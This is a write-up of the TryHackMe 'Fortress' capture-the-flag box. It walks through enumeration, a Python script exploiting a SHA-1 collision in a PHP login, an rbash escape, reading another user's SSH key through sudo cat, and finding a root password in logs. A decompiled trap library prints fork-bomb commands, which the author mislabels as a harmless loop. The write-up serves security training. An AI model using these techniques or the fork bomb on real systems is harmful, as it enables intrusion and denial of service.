<h3> Fortress TryHackMe </h3>

Difficulty = Medium

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b90c908d-b712-4207-b663-334cf62092b1)

Lets start enumeration from ftp 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/584e61c6-87d3-48cb-bdb3-0d832ee5c27f)

Reading the *marked.txt* file shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/de3ab684-1e53-49d5-9494-552336f8eec3)

While checking the file type for the *file* shows it's a python compiled binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e8252502-7679-416a-a5f3-3f21526834b9)

Lets decompile it using [uncompyle2](https://github.com/wibiti/uncompyle2)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d3c64e11-2d32-4558-bc2e-e1bbf94790a0)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/05362c40-c0bf-4158-9aa3-0fe89383676f)

We can see what it does. It creates a socket running on port *5752* and it asks for username and password, If the provided username and password is correct it calls the secret() function which basically opens up the *secret.txt* file

But the username and password is converted from bytes to long I wrote a script to decode it

```python
#!/usr/bin/python3
# Author: Hack.You
from Crypto.Util.number import long_to_bytes

usern = 232340432076717036154994
passw = 10555160959732308261529999676324629831532648692669445488

print(f'Username: {long_to_bytes(usern)}')
print(f'Password: {long_to_bytes(passw)}')
```

Running the script gives the username and password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/071f17a7-1409-409b-b5ac-360259859634)

Now lets connect to the remote socket hosted on port 5752
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d01ccd61-877e-4f5a-8260-2941292587fb)

It gives us this `t3mple_0f_y0ur_51n5`

What can we do with this now 🤔

Lets move over to the web server 

Checking it just shows the normal apache default web page

Fuzzing for directory doesn't lead me anywhere

But when i tried *t3mple_0f_y0ur_51n5* appended with a *.html* gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a1236764-4b54-4f73-be57-aa3958c7c3f9)

But checking source code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1673f22e-ce94-4e8c-a9c0-9311298b1c52)

Also looking at the style.css file gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a063d1e1-bcc3-4e67-9052-99353b710f23)

When decoded it forms this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/412f1966-bc68-4e97-8b6d-2221e85e5d75)

From here we can tell that we're to do a hash collision since *COLLIDING* was capitalized 

Here's what the php code does:

```
1. It assigns zero of length 6 to the badchar variable
2. It checks for if the username and password is passed via a get parameter
3. It converts them to string which are stored respectively in variable test1 and test2
4. It converts the two test variable to hex which are stored in hex1 and hex2 respectively
5. The first check that is done checks if test1 is equal to test2 then it prints out 'You can\'t cross the gates of the temple, GO AWAY!!
6. The second check is that if the string length of test2 is less than or equal to 500 and the string length of test1 is less than or equal to 600. If it is it prints out some error message
7. The third check, checks if the first occurrence of hex1 is equal to the bad byte or the first occurence of hex2 is equal to the bad bytes and if it is it prints an error message
8. The last check compares the sha1 value of test1 with that of test2 # bug here
```

From this we can tell that the bug is in the fourth check as it doesn't use *===* but rather *==* 

Using this past [writeup](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md) on a ctf I edited the script to work for this box

```python
#!/usr/bin/env python
import requests

name = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

name = ''.join(name.split(' '))
password = ''.join(password.split(' '))

namestr = ''.join(['%' + name[i] + name[i + 1]
           for i in range(0, len(name)) if i % 2 == 0])

passwordstr = ''.join(['%' + password[j] + password[j + 1]
           for j in range(0, len(password)) if j % 2 == 0])

url = 'http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={}&pass={}'.format(namestr, passwordstr)
resp = requests.get(url)
print(resp.text)
```

Note: I had to use *t3mple_0f_y0ur_51n5.php* cause that's the main page the login is based on

Running the script works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/149f9965-0e07-4090-9c9c-7a822eff1aae)

We can see this new file in the html *m0td_f0r_j4x0n.txt*

Going over there gives an ssh key
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/834d8346-f8d0-4e7b-8999-5f63018039ad)

Lets login to ssh as user *h4rdy* 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5c692abf-0a51-483d-b33c-9dd4a2986c7c)

After loggin in we can tell that we're restricted to command cause we're in a rbash shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1f2f1171-546c-4c2c-b42e-bc6e7950413b)

Quick google research leads [here](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)

Trying it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f9bfc96-a817-435f-bd59-c881ca2b865b)

But the problem is our path variable is messed up 

Lets fix that 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/888017ab-47ab-4ed3-97f6-e9466f36ce20)

```
Command: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:$PATH
```

Doing *sudo -l* shows we can run *cat* as user *j4x0n*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b64d183-c0c7-494c-959f-0c49246f1888)

Checking [gtfobins](https://gtfobins.github.io/gtfobins/cat/#sudo) shows we can perform *File Read* 

The best file to read is the user's ssh key
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2e636015-36c9-401a-b4c7-591528455224)

Lets save it and login as user *j4x0n*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d2c6a168-6fb9-478b-b3a6-bcf9d96e7bbd)

Looking at the files in the cwd directory shows this *endgame.txt* and viewing it's content shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1670a4b5-faf0-4926-826a-8d1f1f61d402)

It claims that everything has been patched and no way of getting root well lets see about that 😅

I uploaded linpeas to the box and after running it I found this interesting
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7dc2cad0-94a8-497a-bb9c-08463d9f0977)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9a8ab466-ef10-44df-b284-90fc9bc90e9f)

From the result of the scan we can tell that:

```
1. One possible way of escalating privilege to root is by checking the log files since we're in the adm group
2. Checking the suid binary
```

Lets start with the SUID binary first. I uploaded it to my machine for further analysis

After I decompiled it using ghidra and viewing the main function here's what it gave

```c
undefined8 main(void)

{
  puts("Root Shell Initialized...");
  sleep(2);
  puts("Exploiting kernel at super illuminal speeds...");
  sleep(1);
  puts("Getting Root...");
  sleep(3);
  foo();
  return 0;
}
```

The foo function resides in the libcfoo.so file which can be gotten from the box and downloaded to our machine
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ce31e42b-ebb7-4d96-9c5b-d4f4be9ef22b)

After uploading it to my machine and decompiling it here's the function

```c
void foo(void)

{
  puts("Bwahaha, You just stepped into a booby trap XP");
  sleep(2);
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  return;
}
```

We see it's just a loop that runs *cat /dev/urandom* each 2 seconds

So nothing really is worth it in this binary

Lets see if there's any thing in the log files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b5f37e0d-6de8-4b5c-be09-c749262ab4b6)

We see that password *yoU_c@nt_guess_1t_in_zillion_years*

Trying it on *sudo -l* works

Now we can switch to root
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/97caab9e-fa1e-49fa-8617-3829cc289cd5)

And we're done 👻
